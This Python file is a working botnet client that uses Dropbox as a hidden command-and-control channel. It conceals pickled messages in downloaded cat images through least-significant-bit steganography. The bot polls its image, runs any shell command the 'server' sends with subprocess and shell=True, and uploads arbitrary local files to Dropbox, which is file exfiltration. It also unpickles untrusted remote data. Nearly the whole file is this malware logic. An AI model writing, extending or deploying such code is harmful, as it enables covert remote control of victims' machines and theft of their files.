import io
import os
import pickle
import random
import subprocess
import time
import uuid
from dataclasses import dataclass
from datetime import datetime

import PIL.Image
import dropbox
import dropbox.exceptions
import dropbox.files
import requests

ENV_TOKEN = "DROPBOX_TOKEN"


@dataclass
class Command:
    id: int
    input: str
    output: str | None


@dataclass
class Message:
    sender: str
    time: datetime
    command: Command | None


def _encode_bytes(image, data):
    def _yield_bits(byte_array):
        # 1 bit of extra information (says whether the text continues or not), 8 bits of data (1 char)
        # also, the bit order is reversed to make the decoding a little more confusing for intruders
        for d in byte_array:
            yield 0
            for shift in range(8):
                yield (d >> shift) % 2
        yield 1

    # make every part of the pixel even (for bit == 0) and odd (for bit == 1)
    image = image.copy()
    bits = _yield_bits(data)
    pixels = list(image.getdata())
    width, height = image.size
    for i, p in enumerate(pixels):
        r, g, b = p[0], p[1], p[2]
        image.putpixel((i % width, i // width), (
            r // 2 * 2 + next(bits, r % 2),
            g // 2 * 2 + next(bits, g % 2),
            b // 2 * 2 + next(bits, b % 2),
        ))
        if i * 3 + 3 > len(data) * 9:
            break
    return image


def _decode_bytes(image):
    # read all bits
    bits = []
    pixels = list(image.getdata())
    for p in pixels:
        r, g, b = p[0], p[1], p[2]
        bits.append(r % 2)
        bits.append(g % 2)
        bits.append(b % 2)
        # stop when 9th bit is 1
        if len(bits) > 0 and bits[(len(bits) - 1) // 9 * 9] == 1:
            break
    # convert bits to byte array
    data = []
    tmp = 0
    curr = 8
    for b in bits:
        if curr == 8:
            if b == 1:
                break
            tmp = 0
            curr = 0
            continue
        if b == 1:
            tmp += 2 ** curr
        curr += 1
        if curr == 8:
            data.append(tmp)
    return bytes(data)


class Bot:
    def __init__(self, token: str):
        self.name = f'{random.choices(["lukas", "maria", "ondrej", "martin", "sebastian", "veronica"])[0]}{random.randint(100, 999)}'
        self.remote_path = f"/{self.name}.png"
        self.token = token
        self._run()

    def _run(self):
        with dropbox.Dropbox(token) as dbx:
            try:
                image = None
                while True:
                    if image is None:
                        # download a new cat image and save it as PNG
                        image = PIL.Image.open(io.BytesIO(requests.get("https://cataas.com/cat").content))
                        byteIO = io.BytesIO()
                        image.save(byteIO, format='PNG')
                        data = byteIO.getvalue()
                    else:
                        # download image from dropbox and decode it
                        md, res = dbx.files_download(self.remote_path)
                        image = PIL.Image.open(io.BytesIO(res.content))
                        data = _decode_bytes(image)

                    # unpickle data
                    message = None
                    try:
                        message = pickle.loads(data)
                    except pickle.PickleError:
                        print("couldn't unpickle data")
                    except EOFError:
                        print("no data to load")

                    if message is not None and message.sender == "server":
                        # message from control server
                        if message.command is not None:
                            output = ""
                            match message.command.id:
                                case 0:  # run script
                                    output = subprocess.check_output(message.command.input, shell=True).decode("utf-8")
                                case 1:  # upload file
                                    try:
                                        with open(message.command.input, "rb") as f:
                                            remote_path = f"/{uuid.uuid4()}"
                                            dbx.files_upload(f.read(), remote_path, mode=dropbox.files.WriteMode('overwrite'))
                                            output = remote_path
                                    except Exception as e:
                                        print(e)
                                        output = None
                                case _:
                                    print(f"unknown command: {message.command.id}")
                            print(f"> {message.command.input}\n", output)
                            message = Message(
                                sender=self.name,
                                time=datetime.utcnow(),
                                command=Command(
                                    id=message.command.id,
                                    input=message.command.input,
                                    output=output,
                                ),
                            )
                    else:
                        message = Message(
                            sender=self.name,
                            time=datetime.utcnow(),
                            command=None,
                        )

                    # encode data to image and upload it to dropbox
                    data = pickle.dumps(message)
                    image = _encode_bytes(image, data)
                    byteIO = io.BytesIO()
                    image.save(byteIO, format='PNG')
                    dbx.files_upload(byteIO.getvalue(), self.remote_path, mode=dropbox.files.WriteMode('overwrite'))

                    # not to spam dropbox and to let server change our file
                    time.sleep(6)
            except dropbox.exceptions.AuthError:
                print("dropbox auth error")
            except dropbox.exceptions.ApiError:
                print("dropbox api error")


if __name__ == "__main__":
    if ENV_TOKEN not in os.environ:
        raise EnvironmentError(f"{ENV_TOKEN} not set")
    token = os.environ[ENV_TOKEN]

    Bot(token)
